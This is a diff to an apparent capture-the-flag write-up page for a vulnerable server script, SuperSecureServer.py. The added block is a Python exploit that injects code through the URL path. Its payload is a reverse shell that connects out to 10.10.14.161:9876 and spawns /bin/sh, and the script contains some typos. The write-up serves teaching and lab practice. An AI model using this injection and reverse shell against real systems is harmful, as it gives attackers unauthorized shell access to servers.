@@ -173,7 +173,19 @@ So we need to find the SuperSecureServer.py file in order to get the backend cod
 <p><img src="https://i.imgur.com/vhBYHsX.png" alt=""></p>
 <p>So we can execute code if we format correctly the <code>path</code> variable. Therefore, I came up with this little python script:</p>
 <p><img src="https://i.imgur.com/Mxg9BRw.png" alt=""></p>
-<p>When the server processes this, the <code>info</code> variable will look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proxies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;http&#39;</span>: <span style="color:#e6db74">&#39;http://127.0.0.1:8080&#39;</span>, <span style="color:#e6db74">&#39;httpss&#39;</span>: <span style="color:#e6db74">&#39;https://127.0.0.1:8080&#39;</span>}
+</span></span><span style="display:flex;"><span>shell   <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.161&#34;,9876));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> shell
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">ape=&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requets<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> payload)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>headers)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>When the server processes this, the <code>info</code> variable will look like this:</p>
 <blockquote>
 <p>output = &lsquo;Document&rsquo;
 &lt;reverse_shell&gt;
